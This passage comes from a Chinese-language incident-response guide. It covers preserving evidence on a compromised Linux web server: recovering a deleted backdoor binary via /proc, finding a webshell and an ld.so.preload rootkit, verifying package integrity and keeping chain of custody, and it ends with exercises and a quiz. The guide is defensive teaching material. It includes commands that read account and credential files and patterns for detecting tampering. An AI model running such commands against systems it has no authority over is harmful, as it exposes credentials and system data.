grep -rn 'HISTFILE\|HISTSIZE\|HISTCONTROL' /root/.bashrc /home/*/.bashrc /etc/profile 2>/dev/null
```

★★★★ **集中日誌是對抗清除的唯一有效手段** ——
攻擊者可以清掉本機日誌，但清不掉已經送出去的。
這就是為什麼要做 [[090-05-09-guide-資安設備-日誌集中與SIEM]]。

```text
    ★★★★  套件完整性有差異，見 06-integrity.txt
```

> [!warning] ★★★★ 這支腳本的限制
> 1. 如果系統二進位檔已被 rootkit 替換（見 `06-integrity.txt`），
>    它跑出來的 `ps`／`ss` 結果都不可信 —— 要用外部工具重跑。
> 2. 它**不做**記憶體傾印、不做磁碟映像 —— 那需要專業工具與時間。
> 3. `tar -czf ... /var/log` 那一步會讀取所有日誌，改動 atime。
>    若要極致保守，可以改成只列清單不打包。
> 4. **它不會告訴你「有沒有被入侵」**，它只是把現場拍下來給人判讀。

### Windows 主機該看什麼 ★★★

> [!info] Windows 的細節不在本篇
> 使用者已指示 Windows 部分放緩，本篇只列**該看什麼**的清單。
> 系統管理細節見 [[030-01-00-idx-Windows系統管理-Windows管理]]。

| 類別 | 該看什麼 | 概念指引 |
| --- | --- | --- |
| **事件記錄檔** ★★★★★ | Security（登入 4624／失敗 4625／建立帳號 4720／加入群組 4732／日誌被清 1102）、System（服務安裝 7045）、PowerShell 操作記錄 | 事件檢視器；PowerShell 用 `Get-WinEvent` |
| **排程工作** ★★★★★ | 工作排程器中新增或修改的工作、觸發程式指向暫存目錄 | GUI「工作排程器」／`Get-ScheduledTask` |
| **啟動項** ★★★★★ | Run／RunOnce 登錄機碼、啟動資料夾、WMI 事件訂閱 | Sysinternals **Autoruns** 一次看全部 |
| **服務** ★★★★ | 新增的服務、執行檔路徑在非標準目錄、未簽章的執行檔 | `Get-Service`／`Get-CimInstance Win32_Service` |
| **本機帳號與群組** ★★★★★ | 新帳號、被加入 Administrators 的帳號、被啟用的 Guest | `Get-LocalUser`／`Get-LocalGroupMember Administrators` |
| **網路連線** ★★★★★ | 目前連線與對應行程 | `Get-NetTCPConnection`／`netstat -anob` |
| **執行中的程序** ★★★★ | 行程的完整路徑、簽章、父行程 | `Get-Process`／Sysinternals **Process Explorer** |
| **檔案異動** ★★★★ | 近期建立的執行檔、`%TEMP%`／`%APPDATA%` 底下的執行檔 | 依修改時間排序 |
| **AD 相關** ★★★★★ | 網域帳號異動、Kerberos 異常、DC 上的事件記錄 | 見 Windows 群組的 AD 篇章 |

★★★★★ **Autoruns 是 Windows 上做持久化檢查最有效率的單一工具** ——
它一次涵蓋登錄機碼、排程、服務、驅動、瀏覽器擴充等數十個自動執行位置，
並且可以標示「未簽章」與「非微軟」項目。概念上等同於本篇 Linux 的第四大類。

### T+0 分鐘：喊停 ★★★★★

### T+20 分鐘：判讀

#### ① 可疑程序

```bash
cat /mnt/evidence/ir-web01-*/01-SUSPICIOUS-proc.txt
```

```text
31882    sshd                 /tmp/.ICE-unix/sshd (deleted)    /                  ./sshd -q
32104    tar                  /usr/bin/tar                     /var/www/html      tar czf /var/tmp/.x/data.tar.gz .
```

★★★★★ 兩個發現：
- PID 31882：**名稱偽裝成 `sshd`，執行檔在 `/tmp` 且已刪除** → 後門
- PID 32104：**正在把整個網站目錄打包** → 正在外洩資料

#### ② 立刻救回已刪除的執行檔 ★★★★★

```bash
sudo cp /proc/31882/exe /mnt/evidence/recovered-31882-sshd.bin
sudo sha256sum /mnt/evidence/recovered-31882-sshd.bin
sudo file /mnt/evidence/recovered-31882-sshd.bin
sudo strings -n 8 /mnt/evidence/recovered-31882-sshd.bin | grep -iE 'http|[0-9]{1,3}(\.[0-9]{1,3}){3}' | head
```

預期輸出：

```text
84120 bytes
ELF 64-bit LSB executable, x86-64, statically linked, stripped
198.51.100.77
/bin/sh
```

★★★★★ **這個檔案救回來了。** 如果剛才 `kill` 掉它或重開機，就永遠拿不到。
它是靜態連結、去符號的 ELF，內嵌 C2 位址 —— 交給專業分析的關鍵樣本。

#### ③ 資料正在外洩 —— 這是止血優先的情況 ★★★★★

```bash
sudo ls -la /var/tmp/.x/ 2>/dev/null
sudo lsof +L1 | grep data.tar.gz
```

```text
tar  32104  root  3w  REG  259,1  418209792  0  2621877  /var/tmp/.x/data.tar.gz (deleted)
```

> [!danger] ★★★★★ 決策點
> 資料正在被打包。但**網路已經在 T+3 隔離了**，
> 所以就算打包完成也送不出去 —— **不需要 kill 這個程序**。
>
> 判斷準則：**外洩管道是否已經被切斷？**
> - 已切斷（本例）→ 讓它繼續跑完，保留完整證據
> - 未切斷 → 立刻切斷網路；仍無法切斷時才考慮 `kill`
>   （`kill` 前先 `cp /proc/<pid>/exe` 與 `cat /proc/<pid>/cmdline` 留下記錄）

先把外洩檔案本身保全下來（它已被 `unlink`，只能從 `/proc` 拿）★★★★★：

```bash
sudo cp /proc/32104/fd/3 /mnt/evidence/exfil-data.tar.gz
sudo sha256sum /mnt/evidence/exfil-data.tar.gz
sudo tar -tzf /mnt/evidence/exfil-data.tar.gz | head -20
```

★★★★★ 這一步的價值極高：**它直接告訴你「攻擊者打算帶走什麼」**，
是判斷「是否構成個資外洩」的關鍵依據。

#### ④ webshell

```bash
cat /mnt/evidence/ir-web01-*/06-SUSPICIOUS-webshell.txt
```

```text
262147  4 -rw-r--r--  1 www-data www-data  2841 Jun 18 21:47 /var/www/html/uploads/x.php
```

```bash
sudo stat /var/www/html/uploads/x.php
sudo sha256sum /var/www/html/uploads/x.php
sudo cp /var/www/html/uploads/x.php /mnt/evidence/webshell-x.php
```

```text

Change: 2026-06-18 21:47:11 +0800
```

★★★★★ `mtime` 與 `ctime` 一致 → 時間戳沒有被偽造 →
**入侵時間就是 6/18 21:47，距今 77 天。**

> [!danger] ★★★★★ 不要刪掉這個檔案
> 反射動作會想 `rm x.php`。不要。
> 現在網路已隔離，它不會再被利用；但它是**最重要的一份證據**。
> 刪掉之後你就無法證明入侵時間、無法提供樣本、也無法比對其他主機。

#### ⑤ rootkit

```bash
cat /etc/ld.so.preload
sudo ls -la $(cat /etc/ld.so.preload)
```

```text
/lib/x86_64-linux-gnu/libncurses.so.6.4.1
-rwxr-xr-x 1 root root 42088 Jun 18 21:52 /lib/x86_64-linux-gnu/libncurses.so.6.4.1
```

★★★★★ **檔名偽裝成 ncurses 函式庫**（真正的是 `libncurses.so.6.4`，
這個多了一個 `.1`）。這解釋了 `06-integrity.txt` 的結果：

```bash
grep -E 'bin/(ps|ss|ls|netstat)|sbin/sshd' /mnt/evidence/ir-web01-*/06-integrity.txt
```

```text
/usr/bin/ps
/usr/bin/ss
```

> [!danger] ★★★★★ 重大結論：先前的輸出不可信
> `ps` 與 `ss` 的校驗失敗 → 它們已被替換 →
> **前面 `ps auxf`、`ss -tunap` 看到的都可能是被過濾過的結果**，
> 真正的惡意程序可能還有更多，只是被藏起來了。
>
> 補救：用外部工具重跑一次，並直接讀 `/proc` 與 `/proc/net`（核心介面，難以偽造）：
> ```bash
> /media/ir-toolkit/bin/busybox ps
> sudo cat /proc/net/tcp /proc/net/tcp6      # 原始連線表
> sudo ls /proc | grep -E '^[0-9]+$' | wc -l # 真正的行程數量
> ```
> ★★★★ 把 `/proc` 數出來的行程數，跟 `ps` 顯示的數量比對 —— 差額就是被藏起來的。

★★★★★ 第三把金鑰的註解是 `root@localhost`，機關沒有這台主機，

| 現象 | 原因 | 解法 |
| --- | --- | --- |
| 收集腳本跑到一半就停了 ★★★★ | 腳本用了 `set -e`，某個指令回傳非 0 就中止 | 改用 `set -uo pipefail`，**不要加 `-e`**；收集腳本要容忍個別失敗 |
| `ps` 跟 `ls /proc` 數出來的行程數量不一致 ★★★★★ | 系統二進位檔被 rootkit 替換 | 用外部工具或 busybox 重跑；直接讀 `/proc`、`/proc/net/tcp` |
| `debsums: command not found` | 受害機沒裝 | ★★★★★ **不要在受害機上 `apt install`**；改用手動比對 `/var/lib/dpkg/info/*.md5sums` |
| `debsums -c` 回報一大堆設定檔失敗 ★★★ | 設定檔本來就會被改 | 用 `debsums -c -e` 排除設定檔；重點看非設定檔 |
| `rpm -Va` 輸出上千行 | 正常，含大量 mtime／權限差異 | 用 `rpm -Va --nomtime --nomode`，或 `grep '^..5'` 只看內容被改的 |
| `cp /proc/<pid>/exe` 回 `No such file or directory` ★★★★★ | 程序已經結束 | **來不及了**。這就是為什麼不能先 `kill` |
| `cp /proc/<pid>/fd/3` 得到空檔或不完整 ★★★ | 檔案還在寫入中 | 等寫入完成再拷；或接受不完整的樣本（仍有價值） |
| `lsof +L1` 沒有輸出 | 該版本 `lsof` 或核心行為差異；或真的沒有已刪除的開啟檔 | 交叉用 `ls -l /proc/*/fd/* 2>/dev/null \| grep deleted` |
| `utmpdump` 顯示亂碼 ★★★ | 檔案損毀，或架構／位元組序不符 | 損毀本身就是發現；用同架構主機的檔案對照確認 |
| 隔離之後自己也連不進去了 ★★★★★ | 防火牆規則把管理網段一起擋掉 | 事前規劃保留管理路徑；JunOS 用 `commit confirmed 5` 自動回退；最後手段走 console／iLO |
| 隔離後既有連線還在，資料繼續外傳 ★★★★★ | 只加了規則，沒有清除既有 session | JunOS：`clear security flow session source-prefix <ip>`；Linux nft/iptables 需搭配 conntrack 清除 |
| `journalctl --verify` 回報 FAIL ★★★★ | journal 檔被竄改或因斷電損毀 | 記錄下來（是發現，不是故障）；改用集中日誌做為可信來源 |
| 收集出來的檔案寫到受害機自己的磁碟上 ★★★★ | 忘了掛外部媒體，`$OUT` 用了本機路徑 | 執行前先 `df -h <輸出目錄>` 確認掛在外部裝置 |
| 打包 `/var/log` 時 `tar` 報 `file changed as we read it` ★★★ | 日誌正在被寫入 | 正常，不影響已寫入內容；`tar` 離開碼非 0 但檔案可用 |
| 專業人員抱怨「證據被污染」★★★★★ | 你的操作沒有紀錄，分不清哪些改動是你造成的 | 全程 `script` 錄影，並提供操作時間軸 |
| 快照操作按錯，變成 rollback ★★★★★ | `qm snapshot` 與 `qm rollback` 混淆 | 操作前唸出指令；rollback 前一律要求第二人確認 |
| 想做磁碟映像但空間不夠 ★★★★ | 目的碟小於來源碟 | 用壓縮（`dd \| gzip`）或先做關鍵目錄的邏輯備份；或請專業帶設備來 |
| 事後發現重要日誌只留了 7 天 ★★★★★ | 保存期設定過短，且沒有集中 | 當下無解，列為改善事項；見 [[100-01-02-guide-日誌-日誌集中與輪替]] |
| 隔離後主管要求「先讓網站上線再說」★★★★★ | 沒有事先講清楚利害關係 | 提供替代方案（靜態維護頁、切到備援機、從乾淨備份新建一台），**但受害機本體不動** |

## 安全性注意事項

> [!danger] ★★★★★ 五個絕對不要
> 1. **不要重開機或關機**（除非在止血，且優先選上游阻斷）
> 2. **不要重灌、不要 rollback 快照、不要還原備份到原機**
> 3. **不要 `kill` 可疑程序**（先 `cp /proc/<pid>/exe` 與 `/proc/<pid>/fd/*`）
> 4. **不要 `rm` 可疑檔案**（先拷貝、先算雜湊）
> 5. **不要在受害機上安裝任何東西**

| 注意事項 | 說明 |
| --- | --- |
| **恢復服務用新機器，不要修好受害機** ★★★★★ | 從乾淨的映像 + 已驗證的備份**新建**一台，受害機留著調查 |
| **備份可能也中了** ★★★★★ | 入侵 77 天，77 天內的備份都可能含 webshell。還原時要選入侵**之前**的版本，並掃過 |
| **輪替所有憑證** ★★★★★ | 受害機上的 SSH 金鑰、DB 密碼、API token、憑證私鑰全部視為已洩漏 |
| **檢查橫向移動** ★★★★★ | 一台中了就要假設其他台也可能中。至少比對 `ld.so.preload` 與 `authorized_keys` |
| **不要用日常管理帳號登入受害機** ★★★★ | 可能有鍵盤側錄；用臨時帳號或 console，事後停用 |
| **不要把樣本上傳到公開分析平台** ★★★★ | 等於公開告知攻擊者已被發現；也可能外洩機關資訊 |
| **證據不要放在受害機或同網段的儲存上** ★★★★ | 攻擊者可能還有其他管道能碰到 |
| **對外說明由指定窗口統一處理** ★★★★ | 見 [[090-07-04-guide-資安實踐-資安事件應變流程]] |
| **不要在事件群組裡貼受害機的完整日誌** ★★★ | 內含內部 IP、路徑、可能的憑證 |
| **臨時的隔離規則要有收尾清單** ★★★ | 事件結束後要撤，否則日後會變成沒人知道原因的怪規則 |

### 證據保全的實務 ★★★★

#### 磁碟映像（概念）★★★

> [!warning] ★★★ 這是專業工作，本節只講到「你能保住證據」的程度
> 完整的鑑識映像需要寫入阻斷器（write blocker）、驗證程序與工具鏈。
> 機關維運人員通常做不到、也不需要做到。**你要做的是不要毀掉它。**

原理上，磁碟映像就是把整顆磁碟逐位元組複製出來：

```bash
# 概念示意（★★★ 實務上請由專業人員執行）
# 來源必須是「未掛載」或「唯讀掛載」的磁碟
sudo dd if=/dev/sda of=/mnt/evidence/web01-sda.img bs=4M status=progress conv=noerror,sync
sudo sha256sum /dev/sda /mnt/evidence/web01-sda.img
```

★★★★ `dc3dd` 是為鑑識設計的 `dd` 變體，會**同時計算雜湊並產生記錄檔**：

```bash
sudo dc3dd if=/dev/sda of=/mnt/evidence/web01-sda.img hash=sha256 \
     log=/mnt/evidence/web01-sda.log
```

★★★★★ **關鍵在於「來源與映像的雜湊必須相同」** ——
這證明映像是完整、未被修改的副本。

**虛擬機環境的簡化做法** ★★★★：直接保留虛擬磁碟檔即可。

```bash
# PVE：先建快照保住現況，再複製虛擬磁碟檔
qm snapshot 101 forensic-20260903 --description "證據保全"
# 磁碟檔位置依儲存類型而異，例如：
ls -la /var/lib/vz/images/101/
sha256sum /var/lib/vz/images/101/vm-101-disk-0.qcow2
```

★★★ 這比實體機容易得多，是虛擬化環境的一大優勢。

#### 雜湊怎麼留 ★★★★★

| 做法 | 為什麼 |
| --- | --- |
| **每個證據檔都算 SHA-256** ★★★★★ | 證明日後沒有被修改 |
| **雜湊值列表本身也要留一份離線的** ★★★★★ | 紙本抄錄、或存到另一個媒體 |
| **請第二人見證並簽名** ★★★★ | 單一人的紀錄可信度較低 |
| **記錄計算雜湊的時間與工具版本** ★★★ | `sha256sum --version` |
| **不要只算壓縮檔的雜湊** ★★★ | 個別檔案的雜湊也要留，壓縮檔壞了還能救 |

```bash
# 標準做法
cd /mnt/evidence
find . -type f ! -name SHA256SUMS -print0 | xargs -0 sha256sum > SHA256SUMS
sha256sum SHA256SUMS         # ★★★★★ 這一串抄在紙上
```

#### 監管鏈（chain of custody）要記什麼 ★★★★

監管鏈就是「這份證據從產生到現在，經過誰的手、什麼時候、做了什麼」的完整紀錄。
**斷一節，證據的可信度就打折。**

| 欄位 | 內容 | 範例 |
| --- | --- | --- |
| **證據編號** ★★★★ | 自訂唯一編號 | EV-20260903-001 |
| **描述** ★★★★ | 這是什麼 | web01 跡證收集包（含救回之後門執行檔） |
| **來源** ★★★★★ | 從哪一台、哪個路徑取得 | web01（10.10.1.11），`/mnt/evidence/ir-web01-20260903-151544` |
| **取得時間** ★★★★★ | 精確到分鐘、含時區 | 2026-09-03 15:15 (+0800) |
| **取得方式** ★★★★ | 用什麼工具、什麼指令 | ir-collect.sh v1（唯讀） |
| **取得人** ★★★★★ | 姓名、單位、職稱 | 王○○／資訊室／管理師 |
| **見證人** ★★★★ | 第二人簽名 | 李○○ |
| **雜湊值** ★★★★★ | SHA-256 | 9f2c8a…e41b |
| **保管位置** ★★★★ | 實體或邏輯位置 | 資訊室保險櫃、外接硬碟 SN:XXXX |
| **交接紀錄** ★★★★★ | 每一次交出／收回都要簽 | 2026-09-04 10:00 交付○○公司陳工程師，簽名：___ |

```text
────────── 證據監管鏈紀錄表 ──────────

描述　　：web01 跡證收集包

雜湊　　：SHA-256 9f2c8a...e41b
保管　　：資訊室保險櫃

交接紀錄
 日期時間            交出人    接收人           事由            簽章
 2026-09-04 10:00   王○○    ○○公司 陳○○   技術支援分析     ______
 2026-09-06 16:30   陳○○    王○○           分析完成歸還     ______
──────────────────────────────────────
```

★★★ 這張表用紙本、跟證據放在一起最實在。

### 什麼時候該停手找專業 ★★★★

> [!danger] ★★★★★ 出現以下任一項，立刻停手
> 你已經完成的「隔離 + 唯讀收集」是最有價值的貢獻。
> 繼續往下做，只會增加破壞證據的風險。

| 判準 | 為什麼要停 |
| --- | --- |
| **涉及個資外洩（或可能涉及）** ★★★★★ | 有法定義務與責任認定問題，需要具法律效力的鑑識程序 |
| **發現 rootkit 或系統檔被替換** ★★★★★ | 你看到的一切都不可信，需要離線分析 |
| **涉及刑事（勒索、竊取、破壞）** ★★★★★ | 可能需要報案，證據要能作為法律證據 |
| **需要記憶體分析或惡意程式逆向** ★★★★★ | 超出一般維運能力，工具與知識門檻高 |
| **入侵時間長、範圍不明** ★★★★ | 需要跨主機時間線重建 |
| **涉及核心系統（AD、DC、資料庫主機）** ★★★★★ | 影響面過大，處置錯誤代價極高 |
| **關鍵服務長時間中斷、有對外說明壓力** ★★★★ | 需要專業判斷「何時可以安全復原」 |
| **你自己不確定該怎麼做** ★★★★★ | **這一條就足夠了。** 不確定時停手，永遠比亂做好 |

停手時要交出什麼：

1. **跡證收集包** + `SHA256SUMS`（★★★★★）
2. **你做過什麼的完整時間軸**（`script` 紀錄檔）★★★★★
3. **受害機仍在隔離、仍在開機**的狀態 ★★★★★
4. 相關的**集中日誌**與防火牆日誌 ★★★★
5. **資產與架構資訊**（這台是做什麼的、跟誰連、上面有什麼資料）★★★★
6. **監管鏈紀錄表** ★★★

通報程序見 [[090-07-04-guide-資安實踐-資安事件應變流程]]；
若涉及個資，法規面見 [[090-07-07-guide-資安實踐-台灣資安法規與個資法]]。
★★★★★ **通報對象、格式與期限一律依現行規定與來文辦理，不要憑印象。**

## 速查表

### 黃金原則

> ★★★★★ **不重開機、不重灌、不大量操作、不刪不殺 —— 先隔離網路，保持開機。**
> 例外：正在外洩／正在加密／正在攻擊他人時，止血優先（仍優先選上游阻斷）。

### 揮發性順序（先收上面的）

| 順序 | 內容 | 什麼會毀掉它 |
| --- | --- | --- |
| 1 | 記憶體 ★★★★★ | 重開機 |
| 2 | 程序、網路連線 ★★★★★ | 重開機、`kill` |
| 3 | 開啟的檔案、路由表 ★★★★ | 重開機 |
| 4 | `/tmp`、`/dev/shm` ★★★★ | 重開機 |
| 5 | 磁碟檔案與本機日誌 ★★★ | 重灌、`rm` |
| 6 | 集中日誌 ★★★ | 保存期到期 |

### 隔離方式優先序

上游防火牆／交換器阻斷 ★★★★★ ＞ VM 斷網卡 ★★★★ ＞ 實體拔線 ★★★★
＞ 本機防火牆 ★★ ＞ 關機 ★（不得已才用）

### 七大類檢查

| # | 類別 | 關鍵指令 |
| --- | --- | --- |
| 1 | 程序與連線 ★★★★★ | `ps auxf`／`ss -tunap`／`ls -l /proc/*/exe`／`lsof +L1` |
| 2 | 登入紀錄 ★★★★★ | `last -Fax`／`lastb -F`／`utmpdump /var/log/wtmp` |
| 3 | 帳號異動 ★★★★★ | `awk -F: '($3==0)' /etc/passwd`／`stat /etc/shadow` |
| 4 | 持久化 ★★★★★ | crontab／`systemctl list-timers`／`authorized_keys`／`ld.so.preload`／`lsmod` |
| 5 | 檔案異動 ★★★★★ | `debsums -c`／`rpm -Va`／`find -mtime -30`／`find -perm -4000` |
| 6 | 網路設定 ★★★★ | `/etc/resolv.conf`／`/etc/hosts`／`nft list ruleset` |
| 7 | 日誌完整性 ★★★★★ | `journalctl --verify`／每日筆數斷層／`.bash_history` |

### 最有價值的十個單一指令

| 指令 | 找什麼 |
| --- | --- |
| `sudo ls -l /proc/*/exe \| grep deleted` ★★★★★ | 已刪除卻還在跑的後門 |
| `sudo lsof +L1` ★★★★★ | 已刪除但被開啟的檔案（外洩暫存檔） |
| `cat /etc/ld.so.preload` ★★★★★ | LD_PRELOAD rootkit（這檔通常不該存在） |
| `awk -F: '($3==0){print $1}' /etc/passwd` ★★★★★ | 多出來的 UID 0 帳號 |
| `cat /root/.ssh/authorized_keys` ★★★★★ | 後門公鑰 |
| `sudo debsums -c` ／ `sudo rpm -Va` ★★★★★ | 被替換的系統二進位檔 |
| `systemctl list-timers --all` ★★★★ | 被忽略的 systemd 持久化 |
| `stat /etc/shadow` ★★★★★ | 帳號被動過的時間點 |
| `sudo find /var/www -user www-data -name '*.php'` ★★★★★ | webshell |
| `sudo ss -tlnp` ★★★★★ | 多出來的監聽埠（後門） |

### 救回證據的三招 ★★★★★

| 情況 | 指令 |
| --- | --- |
| 執行檔已刪除、程序還活著 | `sudo cp /proc/<pid>/exe /mnt/evidence/x.bin` |
| 檔案已刪除、還被開啟 | `sudo cp /proc/<pid>/fd/<n> /mnt/evidence/y.dat` |
| 想知道程序在做什麼 | `sudo tr '\0' ' ' < /proc/<pid>/cmdline`、`/proc/<pid>/environ`、`/proc/<pid>/maps` |

★★★★★ 這三招的共同前提是 **程序還活著**。所以不要先 `kill`。

### 時間戳判讀

| 觀察 | 意義 |
| --- | --- |
| `mtime` == `ctime` ★★★ | 正常，時間戳未被偽造 |
| `mtime` 遠早於 `ctime` ★★★★★ | **時間戳被 `touch` 偽造過** |
| `/etc/shadow` mtime 在你沒改帳號的時間 ★★★★★ | 有人動過帳號 |
| `authorized_keys` mtime 與入侵時間吻合 ★★★★★ | 後門植入時間 |

### 日誌被清的四個跡象

① 檔案大小為 0／異常小 ★★★★
② 某一天的筆數異常少 ★★★★★
③ `journalctl --verify` 回報 FAIL ★★★★
④ `.bash_history` 是 symlink 指向 `/dev/null` ★★★★★

### 停手判準（任一成立就停）

個資外洩 ★★★★★ ／ rootkit ★★★★★ ／ 涉及刑事 ★★★★★
／ 需記憶體分析或逆向 ★★★★★ ／ 涉及 AD 或 DC ★★★★★
／ **你不確定該怎麼做** ★★★★★

### 交出去的時候要附

跡證收集包 + SHA256SUMS ／ 你的操作時間軸（`script` 紀錄）
／ 受害機**仍隔離仍開機** ／ 集中日誌與防火牆日誌
／ 資產與架構資訊 ／ 監管鏈紀錄表

### 一句話

> ★★★★★ **重灌只花兩小時，但它讓你永遠不知道自己被入侵了多久。**

## 練習題

1. **（黃金原則）** 用不超過 100 字，寫一段可以直接唸給非技術主管聽的說明，
   解釋「為什麼不能立刻重灌」。要能在 30 秒內講完。

2. **（收集腳本）** 在一台測試機上部署 `ir-collect.sh` 並執行，
   確認輸出目錄結構與 `SHA256SUMS` 都正確產生。
   接著故意在 `/tmp` 放一個可執行檔並執行它，再跑一次腳本，
   確認它出現在 `01-SUSPICIOUS-proc.txt`。**測完記得清乾淨。**

3. **（救回已刪除的執行檔）** 在測試機上：複製 `/bin/sleep` 到 `/tmp/test`，
   執行 `/tmp/test 600 &`，然後 `rm /tmp/test`。
   確認 `ls -l /proc/<pid>/exe` 顯示 `(deleted)`，
   再用 `cp /proc/<pid>/exe` 把它救回來，並用 `sha256sum` 驗證與原始 `/bin/sleep` 相同。

4. **（基線）** 對你負責的兩台同角色主機，各產生一份
   `ss -tlnp`、`systemctl list-unit-files --state=enabled`、
   `find / -xdev -perm -4000 -type f` 的清單，`diff` 兩者。
   說明每一項差異的原因。**把這三份清單存起來，這就是你的基線。**

5. **（完整性驗證）** 在測試機上執行 `sudo debsums -c`（或 `rpm -Va`）。
   接著故意用 `echo '#' | sudo tee -a /usr/bin/somescript` 改一個屬於套件的檔案，
   再跑一次，確認它被抓出來。**測完用 `apt install --reinstall` 還原。**

6. **（時間戳）** 建立一個檔案，用 `touch -r /bin/ls <file>` 偽造它的 mtime，
   然後用 `stat` 觀察 `Modify` 與 `Change` 的差異，說明為什麼 `ctime` 抓得到偽造。

7. **（桌上推演）** 拿本篇的實戰範例當劇本，找兩位同事各扮演
   「值班主管」與「應用系統負責人」，實際演練 T+0 到 T+10 分鐘的溝通與決策。
   記錄下卡住的地方。

> [!question]- 練習題參考答案
>
> **1.** 範例：「現在重灌，機器兩小時就能上線，但我們會永遠不知道對方
> 是怎麼進來的、待了多久、拿走什麼、還有哪幾台也被打了。
> 兩週後同一個洞會被再打一次。先隔離網路保持開機，服務我用另一台新機器頂上，
> 這樣兩邊都顧到。」
> ★★★★★ 關鍵是**同時提供替代方案**，不能只說「不可以」。
>
> **2.** 應該看到 `01-SUSPICIOUS-proc.txt` 中出現該執行檔的路徑。
> ★★★ 若沒有，檢查 grep 的路徑樣式是否涵蓋你放置的目錄。
>
> **3.** `sha256sum` 應完全相同。★★★★★ 這證明了「只要程序活著，
> 檔案就救得回來」—— 反過來說，`kill` 之後就永遠救不回來。
>
> **4.** 常見的合理差異：不同的監控 agent、不同的網卡設定、
> 一台裝了額外的除錯工具。★★★★ 任何你**解釋不了**的差異，都值得追下去。
>
> **5.** `debsums -c` 會列出 `/usr/bin/somescript`。
> ★★★★★ 這說明套件管理員本身就是一份現成的完整性基線，不需要額外建置。
>
> **6.** `stat` 會顯示 `Modify` 是 `/bin/ls` 的舊時間，但 `Change`（ctime）
> 是你執行 `touch` 的當下。★★★★★ 因為 ctime 記錄的是 inode 中繼資料的變更時間，
> `touch` 本身就是一次 inode 變更，無法規避。
>
> **7.** 最常卡住的三個地方：
> ① 主管問「多久能恢復」而你答不出來；
> ② 沒有人知道這台機器上到底有沒有個資；
> ③ 找不到誰有權限決定「可以斷線」。
> ★★★★★ 這三個問題應該在事前就有答案（服務衝擊分析、資料分級、決策授權），
> 見 [[090-07-04-guide-資安實踐-資安事件應變流程]]。

## 小測驗

**Q1.** 發現主機疑似被入侵，下列第一個動作何者最正確？
　(A) 立刻關機以免災情擴大
　(B) 立刻重灌以恢復服務
　(C) 在上游防火牆隔離網路，但保持開機
　(D) 立刻刪除找到的可疑檔案

**Q2.** （是非）看到可疑程序在跑，應該先 `kill` 掉，避免它繼續造成傷害。

**Q3.** `ls -l /proc/31882/exe` 輸出 `-> /tmp/.ICE-unix/sshd (deleted)`。
請說出兩個可疑之處，以及你**必須立刻**做的一件事。

**Q4.** 為什麼 `/etc/ld.so.preload` 這個檔案存在本身就高度可疑？
它會造成什麼後果？

**Q5.** （選擇）下列哪一項在 Linux 上是「不需額外建置就已經存在」的完整性基線？
　(A) AIDE 資料庫　(B) 套件管理員的檔案校驗（`debsums`／`rpm -Va`）
　(C) Wazuh FIM　(D) 全機檔案雜湊

**Q6.** 某檔案的 `stat` 顯示 `Modify: 2024-03-11`、`Change: 2026-06-18`。
這代表什麼？為什麼攻擊者改不掉後者？

**Q7.** 「揮發性順序」是什麼？依照它，記憶體、磁碟檔案、集中日誌
三者的收集優先順序為何？

**Q8.** （是非）既然已經在防火牆上加了阻斷規則，受害機的既有連線就會立刻中斷。

**Q9.** 在什麼情況下，「止血」可以優先於「保全證據」？請舉出至少兩種，
並說明即使在這些情況下，仍應優先採用哪一種止血手段。

**Q10.** 你把調查工作交給外部專業人員時，除了證據檔案本身，
還必須交出哪一項東西？為什麼它不可或缺？

> [!question]- 測驗答案
>
> **Q1 — (C)。** 隔離止血、保持開機保住記憶體與程序這兩層揮發性最高的證據。
> (A) 毀掉記憶體；(B) 毀掉幾乎全部；(D) 毀掉關鍵證據且無助於解決問題。
> → 見開篇 `[!danger]` 與「隔離的正確做法」。★★★★★
>
> **Q2 — 否。** `kill` 之後 `/proc/<pid>/` 整個消失，
> 若執行檔已被刪除（`(deleted)`），檔案本體就永遠救不回來。
> 正確順序是先 `cp /proc/<pid>/exe`、收集 `cmdline`／`environ`／`fd`，
> 而且在網路已隔離的前提下通常根本不需要 kill。
> → 見「救回證據的三招」。★★★★★
>
> **Q3 — 兩個可疑之處：**
> ① 程序名稱是 `sshd`，但**執行檔位於 `/tmp`**（正常的 sshd 在 `/usr/sbin`）；
> ② 標記 `(deleted)`，表示執行檔已從磁碟刪除，只存在於記憶體。
> **必須立刻做的事**：`sudo cp /proc/31882/exe /mnt/evidence/x.bin`
> 把它救回來 —— 這是唯一的機會。
> → 見「程序名稱偽裝的識破」。★★★★★
>
> **Q4 —** `/etc/ld.so.preload` 中列出的共享函式庫會被載入到
> **每一個動態連結的程式**裡，可以攔截並改寫任何函式庫呼叫。
> 後果是 `ls`、`ps`、`ss`、`netstat` 等工具會被騙得看不到攻擊者的檔案、
> 程序與連線 —— 也就是說**你先前所有的檢查結果都不可信**。
> 絕大多數正常系統上這個檔案根本不存在。
> → 見「動態連結庫劫持」與實戰範例第 ⑤ 點。★★★★★
>
> **Q5 — (B)。** 套件管理員在安裝時就記錄了每個檔案的校驗值，
> 這是每一台 Linux 都現成擁有的基線，不需要事先規劃或建置。
> (A)(C)(D) 都必須事前部署，事件當下才想做就來不及了。
> → 見「用套件管理員驗證系統檔完整性」。★★★★★
>
> **Q6 —** 代表這個檔案的 **mtime 被偽造過**（例如用 `touch -r` 複製了別的檔案的時間），
> 但它的 inode 中繼資料實際上是在 2026-06-18 被變更的。
> 攻擊者改不掉 `ctime` 的原因是：**任何修改 inode 的動作（包含 `touch` 本身）
> 都會把 ctime 更新為當下**，沒有標準介面可以直接設定它。
> → 見「ctime 是 touch 改不掉的」。★★★★★
>
> **Q7 —** 揮發性順序是「證據消失速度」的排序，消失越快的越要先收。
> 順序為：**記憶體（重開機就沒了）→ 磁碟檔案（重灌才沒）→ 集中日誌（最安全）**。
> → 見「揮發性順序」。★★★★
>
> **Q8 — 否。** 有狀態防火牆對**已建立的 session** 通常會繼續放行，
> 新規則只影響新連線。必須另外清除既有 session
> （JunOS：`clear security flow session source-prefix <ip>`），
> 否則資料可能繼續外傳。
> → 見實戰範例 T+3 與排錯表。★★★★★
>
> **Q9 —** 至少兩種：① 資料正在被大量外傳；② 檔案正在被勒索軟體加密；
> （第三種：這台正在攻擊其他主機。）
> 即使如此，仍應**優先採用「上游阻斷」而非關機** ——
> 上游阻斷同樣能止血，卻能保住記憶體與程序這兩層最揮發的證據。
> 只有在上游阻斷來不及、或傷害發生在本機（如加密）時才考慮強制關機，
> 且拔電源優於正常關機。
> → 見「唯一的例外：正在流血的時候」。★★★★★
>
> **Q10 — 必須交出「你自己做過什麼」的完整紀錄**（`script` 錄影檔／操作時間軸）。
